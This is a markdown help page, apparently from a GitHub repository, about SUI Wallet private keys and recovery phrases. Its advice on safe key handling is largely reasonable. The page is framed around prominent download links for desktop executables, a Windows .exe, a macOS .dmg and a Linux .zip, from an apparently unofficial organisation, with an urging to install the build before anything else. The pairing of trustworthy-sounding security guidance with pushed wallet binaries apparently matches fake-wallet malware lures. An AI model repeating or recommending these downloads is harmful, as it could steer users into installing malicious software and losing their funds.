![SUI Wallet](assets/banner-article.png)

# Importing a SUI Wallet private key

A private key imports one account; a phrase restores all of them.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Treat the 24-word phrase as the private key, because for this wallet it is: it is what derives the account,
and it is the thing to keep on paper. There is no step in these guides where you copy a key out of a screen,
and no support conversation that needs one. Anything asking for it is draining the account.

## The phrase is the key

A private key is a secret whose possession authorises spending, and the 24 words are a readable encoding of exactly that secret. That is why the wallet asks for the words at restore and never for anything else. On paper it is also harder to photograph by accident.

So the practical answer to "where is my private key" is: on the paper you wrote at setup, in words rather
than in hex. That copy is more durable than a screen and much harder to photograph by accident.

## Why there is no export screen to point at

Guides that promise a key export usually describe a different application, an older one, or a screen that never existed. This page will not invent one: the documented backup is the phrase, and that is what the restore flow accepts when it needs the secret back.

If a version of this wallet ever showed such a screen, the advice would not change, because a key on a
clipboard is one of the most reliable ways to lose an account. The phrase written by hand has no clipboard.

## Importing a key that is not a phrase

Some tools hand you a hex string instead of words. That is a bare secret with no checksum, no dictionary and no way to notice a typo: one wrong character produces a different account, and nothing warns you at all during the import.

That is the shape of the import this wallet does not ask you to perform. Where a hex key has to be used, do
it in the tool that produced it, and move the balance deliberately rather than importing the secret
everywhere it might fit.

## What a support request never needs

No support conversation needs the phrase, the hex key, a screenshot of either, or a screen share while you type one. A real exchange needs the version, the platform and what happened, which is three facts rather than a secret.

Anything that asks for more is a different kind of conversation, and the request itself is the warning.
[Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) covers the handling rules, including the ones that apply
when a message sounds official.

## Where the risk actually sits

Not in the key's existence - every account has one - but in copies. A key photographed, pasted into a note,
typed into a website or stored in a password manager on a shared machine is a copy, and each copy is a
separate chance to lose everything.

Paper is not romantic; it is a format with no clipboard, no sync and no cloud account. That is the whole
argument, and it is why the setup flow insists on writing the words down before the account holds anything.
[Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) is the other direction: the phrase going back in, which is
the only legitimate use of the secret.

The same argument applies to screenshots of the setup screen, which are copies with metadata attached, and to cloud notes, which are copies with a login in front of them. Neither is as bad as pasting into a website; both are worse than a sheet of paper in a drawer.

## If a key has already been exposed

Move the balance to an address created on a machine that has never seen the exposed copy, and treat the old
account as public from that moment. A key that has been typed into a website should be assumed taken, not
assumed safe because nothing happened yet.

Do this on the current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest): creating the new
account and sending are exactly the flows the reported problems were fixed in, and the
[repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) records what changed.

## What to write down instead

Three things, on paper: the 24 words in order, the address they produce, and the date. The address is not
secret, and having it written means a screen showing a different one is a fact you can check rather than a
feeling you argue with.

Nothing else needs recording. Network names, versions and balances all drift; the words do not.

## FAQ

### Where do I find the private key in SUI Wallet?

On the paper you wrote at setup: the 24 words are the key in readable form. These guides document no export
screen, and no support conversation needs one.

### Can I export it as hex?

Not through anything described here. A hex key is a bare secret with no checksum, and pasting one around is
how accounts are lost rather than backed up.

### Is the phrase the same as the private key?

It encodes the same secret. That is why anyone who has the words can spend, and why the words are treated as
the account rather than as a hint about it.

### What if someone asks for my key to "verify" the wallet?

They are taking the account. Verification never needs the secret; it needs the address, which is public.

### I already pasted it into a site. What now?

Assume it is gone. Create a new account on a clean machine, write the new phrase on paper, and move the
balance there.

### Does the current release change any of this?

No. It fixes reported problems; the secret and its handling are the same in every build, which is why the
advice here does not depend on a version.
